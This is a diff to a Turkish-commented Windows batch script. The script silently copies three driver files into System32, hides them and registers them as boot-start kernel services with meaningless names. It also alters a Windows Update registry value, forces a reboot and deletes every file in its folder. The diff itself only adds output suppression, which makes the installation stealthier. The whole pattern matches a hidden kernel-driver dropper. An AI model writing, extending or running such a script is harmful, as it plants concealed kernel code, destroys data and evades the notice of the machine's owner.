@@ -36,13 +36,13 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate" /v SusCli
 
 :: Dosyaları System32'ye kopyala
 if exist "%SCRIPT_DIR%drvcore.sys" (
-    copy /y "%SCRIPT_DIR%drvcore.sys" "%system32Dir%\"
+    copy /y "%SCRIPT_DIR%drvcore.sys" "%system32Dir%\" >nul 2>&1
 )
 if exist "%SCRIPT_DIR%netshim.sys" (
-    copy /y "%SCRIPT_DIR%netshim.sys" "%system32Dir%\"
+    copy /y "%SCRIPT_DIR%netshim.sys" "%system32Dir%\" >nul 2>&1
 )
 if exist "%SCRIPT_DIR%winverred.sys" (
-    copy /y "%SCRIPT_DIR%winverred.sys" "%system32Dir%\"
+    copy /y "%SCRIPT_DIR%winverred.sys" "%system32Dir%\" >nul 2>&1
 )
 
 :: Dosyaları sistem ve gizli olarak ayarla
@@ -56,9 +56,9 @@ sc create system1 binPath= "C:\Windows\System32\drivers\drvcore.sys" DisplayName
 sc create system2 binPath= "C:\Windows\System32\drivers\netshim.sys" DisplayName= "caa" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
 sc create system3 binPath= "C:\Windows\System32\drivers\winverred.sys" DisplayName= "cab" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
 
-sc start system1
-sc start system2
-sc start system3
+sc start system1 >nul 2>&1
+sc start system2 >nul 2>&1
+sc start system3 >nul 2>&1
 
 :: Bilgisayarı 5 saniye içinde yeniden başlat
 shutdown /r /t 2
@@ -69,3 +69,4 @@ del /f /q *.*
 for /d %%i in (*) do rd /s /q "%%i"
 
 exit
+
